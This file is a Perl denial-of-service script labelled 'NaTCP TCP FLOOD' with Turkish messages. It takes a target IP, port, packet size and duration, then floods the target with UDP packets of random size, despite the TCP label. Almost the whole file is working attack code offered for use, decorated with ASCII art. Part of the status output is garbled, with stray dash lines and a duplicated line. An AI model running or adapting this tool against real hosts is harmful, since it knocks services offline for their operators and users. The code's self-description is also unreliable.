#!/usr/bin/perl

##                             ##
#   MBE Software - PerlDos      #
##                             ##

use Socket;
use strict;
eval {require Socket6}; our $has_socket6 = 0;
unless ($@) { $has_socket6 = 1; import Socket6; };
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;
our $ipv6 = 0;

print   BOLD GREEN"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" unless $time;
print  "     ALL TCP METHOD || NaTCP || MBE Software - PerlDos* \n";
print  "     Kullanım: perl NaTCP.pl <IP> <Port> <Boyut> <Saniye>\n";
print   BOLD GREEN"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" unless $time;
my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "      NaTCP.pl ALL TCP METHOD MBE Software - PerlDos*$ip\n";
$endtime = time() + ($time ? $time : 99999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print BOLD GREEN<<EOTEXT;

  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                 ~ [+] NaTCP TCP FLOOD Script [+] ~	
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |  C:\> _ root@~Attack Loading...             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'

               ooooooooo                                        
               888    88o   ooooooo  oooo  o  oooo oo oooooo   
               888    888 888     888 888 888 888   888   888  
               888    888 888     888  888888888    888   888  
               o888ooo88     88ooo88     88   88    o888o o888o
EOTEXT

 print BOLD WHITE "            [+] Saldirdiginiz IP Adresi : $ip
            [+] Saldirdiginiz Port Adresi : " .

-
-
-
-

        ($port ? $port : "random") ." ".($time ? "= $time [+] Saniye" : "
            [+] Saldiriniz Suanda gerceklestiriliyor. ") . "\n";
        ($port ? $port : "random") ." ".($time ? "= $time [+] Saniye" : "
            [+] Saldiriniz Suanda gerceklestiriliyor. ") . "\n";
        print   BOLD BLUE"            [+] Durdurmak için Ctrl-C\n" unless $time;
        print   BOLD GREEN"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" unless $time;


for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(999))+1;

  if(1 != $ipv6) {
    send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  } else {
    send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in6($pport, $iaddr));
  };
  usleep(1000 * $delay) if $delay;
}